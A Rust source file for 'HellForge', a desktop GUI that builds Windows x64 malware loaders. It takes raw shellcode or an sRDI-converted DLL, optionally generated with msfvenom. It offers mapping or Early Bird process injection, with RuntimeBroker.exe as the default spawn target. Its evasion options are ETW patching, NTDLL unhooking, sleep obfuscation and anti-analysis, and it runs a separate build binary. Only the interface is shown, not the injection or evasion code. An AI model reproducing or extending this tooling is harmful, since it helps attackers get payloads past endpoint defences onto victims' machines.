use std::{
    path::PathBuf,
    sync::{Arc, Mutex},
};

use eframe::egui;

use crate::{
    msf::MsfDialog,
    runner::{spawn_build, BuildConfig},
    types::{BuildState, Log},
};

pub struct HellForge {
    // payload
    pub use_dll:      bool,
    pub file_path:    String,

    // injection
    pub early_bird:   bool,
    pub inject_field: String,

    // feature flags
    pub aa:           bool,
    pub debug:        bool,
    pub etw:          bool,
    pub unhook:       bool,
    pub sleep_obf:    bool,
    pub sleep_ms:     String,

    // output
    pub out_name:     String,

    // state
    pub log:          Log,
    pub build_state:  Arc<Mutex<BuildState>>,

    // msf dialog
    pub msf_open:     bool,
    pub msf:          MsfDialog,

    // path to the `build` CLI binary (sits next to this exe)
    pub build_bin:    PathBuf,
}

impl HellForge {
    pub fn new(cc: &eframe::CreationContext) -> Self {
        let mut style = (*cc.egui_ctx.style()).clone();
        style.text_styles.iter_mut().for_each(|(_, fs)| fs.size = 13.0);
        cc.egui_ctx.set_style(style);

        let build_bin = std::env::current_exe()
            .ok()
            .and_then(|p| p.parent().map(|d| d.join("hfbuild")))
            .unwrap_or_else(|| PathBuf::from("hfbuild"));

        Self {
            use_dll:      false,
            file_path:    String::new(),
            early_bird:   false,
            inject_field: String::new(),
            aa:           true,
            debug:        false,
            etw:          false,
            unhook:       false,
            sleep_obf:    false,
            sleep_ms:     "10000".into(),
            out_name:     String::new(),
            log:          Arc::new(Mutex::new(String::new())),
            build_state:  Arc::new(Mutex::new(BuildState::Idle)),
            msf_open:     false,
            msf:          MsfDialog::default(),
            build_bin,
        }
    }

    fn is_building(&self) -> bool {
        *self.build_state.lock().unwrap() == BuildState::Running
    }

    fn on_build(&mut self, ctx: egui::Context) {
        let cfg = BuildConfig {
            build_bin:    &self.build_bin,
            use_dll:      self.use_dll,
            file_path:    &self.file_path,
            early_bird:   self.early_bird,
            inject_field: &self.inject_field,
            aa:           self.aa,
            debug:        self.debug,
            etw:          self.etw,
            unhook:       self.unhook,
            sleep_obf:    self.sleep_obf,
            sleep_ms:     &self.sleep_ms,
            out_name:     &self.out_name,
        };

        match spawn_build(cfg, Arc::clone(&self.log), Arc::clone(&self.build_state), ctx) {
            Ok(cmd_str) => {
                self.log.lock().unwrap().push_str(&cmd_str);
            }
            Err(e) => {
                self.log.lock().unwrap()
                    .push_str(&format!("[!] Failed to launch build: {e}\n"));
            }
        }
    }
}

impl eframe::App for HellForge {
    fn update(&mut self, ctx: &egui::Context, _frame: &mut eframe::Frame) {
        if self.msf_open {
            self.msf.show(ctx, &mut self.msf_open, &mut self.file_path);
        }

        egui::CentralPanel::default().show(ctx, |ui| {
            ui.heading("HellForge");
            ui.label("Windows x64 output only — input must be Windows shellcode");
            ui.add_space(6.0);

            // ── Mode ─────────────────────────────────────────────────────────
            ui.group(|ui| {
                ui.horizontal(|ui| {
                    ui.label("Mode:");
                    if ui.radio(!self.use_dll, "Shellcode (.bin)").clicked() {
                        self.use_dll = false;
                        self.file_path.clear();
                    }
                    if ui.radio(self.use_dll, "DLL (sRDI)").clicked() {
                        self.use_dll = true;
                        self.file_path.clear();
                    }
                });

                ui.horizontal(|ui| {
                    ui.label("File:");
                    ui.add(
                        egui::TextEdit::singleline(&mut self.file_path)
                            .desired_width(300.0)
                            .hint_text("path to payload"),
                    );
                    if ui.button("Browse…").clicked() {
                        let ext = if self.use_dll { "dll" } else { "bin" };
                        if let Some(p) = rfd::FileDialog::new()
                            .add_filter("payload", &[ext])
                            .pick_file()
                        {
                            self.file_path = p.to_string_lossy().into_owned();
                        }
                    }
                    if ui.button("Gen (msf)").clicked() {
                        self.msf_open = true;
                    }
                });
            });

            ui.add_space(4.0);

            // ── Injection ────────────────────────────────────────────────────
            ui.group(|ui| {
                ui.horizontal(|ui| {
                    ui.label("Inject:");
                    if ui.radio(!self.early_bird, "Mapping").clicked() {
                        self.early_bird = false;
                        self.inject_field.clear();
                    }
                    if ui.radio(self.early_bird, "Early Bird").clicked() {
                        self.early_bird = true;
                        if self.inject_field.is_empty() {
                            self.inject_field =
                                "C:\\Windows\\System32\\RuntimeBroker.exe".into();
                        }
                    }
                });

                ui.horizontal(|ui| {
                    let lbl  = if self.early_bird { "Spawn:" } else { "Target:" };
                    let hint = if self.early_bird {
                        "process to spawn"
                    } else {
                        "remote process name (blank = self)"
                    };
                    ui.label(lbl);
                    ui.add(
                        egui::TextEdit::singleline(&mut self.inject_field)
                            .desired_width(360.0)
                            .hint_text(hint),
                    );
                });
            });

            ui.add_space(4.0);

            // ── Feature flags ────────────────────────────────────────────────
            ui.group(|ui| {
                ui.horizontal(|ui| {
                    ui.checkbox(&mut self.aa,     "Anti-Analysis");
                    ui.checkbox(&mut self.etw,    "ETW Patch");
                    ui.checkbox(&mut self.unhook, "Unhook NTDLL");
                });
                ui.horizontal(|ui| {
                    ui.checkbox(&mut self.sleep_obf, "Sleep Obfuscation");
                    ui.add_enabled(
                        self.sleep_obf,
                        egui::TextEdit::singleline(&mut self.sleep_ms).desired_width(70.0),
                    );
                    ui.label("ms");
                });
            });

            ui.add_space(4.0);

            // ── Output ───────────────────────────────────────────────────────
            ui.group(|ui| {
                ui.horizontal(|ui| {
                    ui.label("Output:");
                    ui.add(
                        egui::TextEdit::singleline(&mut self.out_name)
                            .desired_width(260.0)
                            .hint_text("loader_<timestamp>  (no .exe)"),
                    );
                    ui.checkbox(&mut self.debug, "Debug");
                });
            });

            ui.add_space(6.0);

            // ── Build controls ───────────────────────────────────────────────
            ui.horizontal(|ui| {
                let building = self.is_building();
                let lbl = if building { "Building…" } else { "  BUILD  " };

                if ui.add_enabled(
                    !building && !self.file_path.is_empty(),
                    egui::Button::new(egui::RichText::new(lbl).size(14.0).strong()),
                ).clicked() {
                    self.on_build(ctx.clone());
                }

                if ui.button("Clear Log").clicked() {
                    self.log.lock().unwrap().clear();
                }

                if self.file_path.is_empty() {
                    ui.colored_label(egui::Color32::YELLOW, "← select a payload first");
                }
            });

            ui.add_space(4.0);

            // ── Log ──────────────────────────────────────────────────────────
            let mut log_snap = self.log.lock().unwrap().clone();
            egui::ScrollArea::vertical()
                .auto_shrink([false, false])
                .stick_to_bottom(true)
                .show(ui, |ui| {
                    ui.add(
                        egui::TextEdit::multiline(&mut log_snap)
                            .font(egui::TextStyle::Monospace)
                            .desired_width(f32::INFINITY)
                            .desired_rows(14)
                            .interactive(false),
                    );
                });
        });
    }
}
